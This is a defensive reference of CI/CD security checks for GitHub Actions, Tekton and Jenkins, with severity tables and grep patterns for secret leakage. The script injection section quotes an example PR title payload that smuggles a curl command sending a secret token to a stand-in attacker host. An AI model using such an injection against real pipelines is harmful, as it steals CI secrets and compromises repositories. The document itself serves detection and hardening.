# CI/CD Pipeline Security Reference

Security checks for GitHub Actions, CI/CD workflows, and build pipeline configurations.

## GitHub Actions Security

### Workflow Permissions

| Check | Pattern | Severity |
|-------|---------|----------|
| Overly broad permissions | `permissions: write-all` or no `permissions` key (defaults to broad) | HIGH |
| Unnecessary write scopes | `contents: write`, `packages: write` when only reads are needed | MEDIUM |
| Missing permissions block | Workflow without explicit `permissions` declaration | MEDIUM |

**Best practice:** Set `permissions: read-all` at workflow level, grant specific write permissions per job.

### Action Pinning

| Check | Pattern | Severity |
|-------|---------|----------|
| Unpinned actions | `uses: actions/checkout@v4` (tag, not SHA) | MEDIUM |
| Branch references | `uses: org/action@main` | HIGH |
| Latest tag | `uses: org/action@latest` | HIGH |

**Expected format:** `uses: actions/checkout@<full-sha-hash>`

Actions pinned to tags can be moved by the action author. Only SHA pinning is truly immutable.

### Dangerous Triggers

| Check | Pattern | Severity |
|-------|---------|----------|
| `pull_request_target` | Trigger that runs with repo write access on PR code | CRITICAL |
| `pull_request_target` + `checkout PR` | Checking out PR head ref in `pull_request_target` workflow | CRITICAL |
| `workflow_dispatch` without auth | Manual trigger without required approvals | MEDIUM |
| `repository_dispatch` | External event trigger — verify source authentication | MEDIUM |

**Why `pull_request_target` is dangerous:** It runs with the base repo's secrets and write permissions but can be triggered by untrusted PR code. If the workflow checks out the PR's code (`actions/checkout@ref: ${{ github.event.pull_request.head.ref }}`), an attacker's code runs with elevated privileges.

### Secret Handling

| Check | Pattern | Severity |
|-------|---------|----------|
| Secrets in run commands | `echo ${{ secrets.* }}` or printing secrets in logs | CRITICAL |
| Secrets as env for all steps | `env: SECRET: ${{ secrets.* }}` at job level when only one step needs it | MEDIUM |
| Secrets in outputs | `echo "::set-output name=val::${{ secrets.* }}"` | CRITICAL |
| Secrets in artifact uploads | Uploading files that contain injected secrets | HIGH |
| Missing environment protection | Secrets not scoped to GitHub Environments with approval rules | MEDIUM |

**Grep patterns:**
```
echo.*\$\{\{\s*secrets\.
set-output.*secrets\.
::set-env.*secrets\.
```

### Script Injection

| Check | Pattern | Severity |
|-------|---------|----------|
| Direct context interpolation | `run: echo "${{ github.event.issue.title }}"` | HIGH |
| PR title/body in commands | Using `${{ github.event.pull_request.title }}` in `run:` | HIGH |
| Comment body in commands | Using `${{ github.event.comment.body }}` in `run:` | CRITICAL |

**Why this matters:** GitHub context expressions are interpolated before the shell executes. A malicious PR title containing `"; curl attacker.com/steal?token=$SECRET; echo "` becomes shell injection.

**Safe alternative:** Pass context values through environment variables:
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"  # Shell-quoted, safe from injection
```

### Self-Hosted Runner Risks

| Check | Pattern | Severity |
|-------|---------|----------|
| Self-hosted on public repos | `runs-on: self-hosted` in public repository | CRITICAL |
| Persistent self-hosted runners | Self-hosted without ephemeral configuration | HIGH |
| Missing runner labels | Using `self-hosted` without environment-specific labels | MEDIUM |

## General CI/CD Patterns

### Build Security

| Check | Pattern | Severity |
|-------|---------|----------|
| Skip verification flags | `--no-verify`, `--skip-tests`, `--no-check` in build scripts | HIGH |
| Disabled security scans | Conditional skips of security scanning steps | HIGH |
| Unvalidated external inputs | Build scripts using environment variables without validation | MEDIUM |
| Missing build reproducibility | No pinned tool versions in build environment | MEDIUM |

### Credential Leakage

| Check | Pattern | Severity |
|-------|---------|----------|
| Credentials in CLI args | `--password`, `--token`, `--api-key` with values (visible in process list) | HIGH |
| Credentials in logs | `set -x` in scripts that handle credentials | HIGH |
| Unmasked outputs | Credential values not wrapped in `::add-mask::` | MEDIUM |
| Credentials in build cache | Docker build cache containing credential layers | HIGH |

### Supply Chain Integrity

| Check | Pattern | Severity |
|-------|---------|----------|
| No integrity checks | Downloading binaries/dependencies without checksum verification | HIGH |
| HTTP downloads | `curl http://` or `wget http://` (not HTTPS) | HIGH |
| Missing SLSA provenance | Release artifacts without provenance attestation | LOW |
| Unsigned containers | Publishing container images without signing (cosign/notation) | MEDIUM |

## Tekton Pipeline Security

| Check | Pattern | Severity |
|-------|---------|----------|
| Privileged tasks | `securityContext.privileged: true` in task steps | HIGH |
| Unbounded resources | Tasks without resource limits | MEDIUM |
| Inline scripts with secrets | Secret references in inline script blocks | HIGH |
| Missing pipeline-level RBAC | ServiceAccount with excessive cluster permissions | HIGH |

## Jenkins Pipeline Security

| Check | Pattern | Severity |
|-------|---------|----------|
| Plaintext credentials | `withCredentials` blocks logging credential values | HIGH |
| Groovy sandbox bypass | `@NonCPS` annotations or script approval bypasses | HIGH |
| Shared library trust | Loading shared libraries from untrusted sources | HIGH |
| Agent label wildcards | `agent any` in production pipelines | MEDIUM |
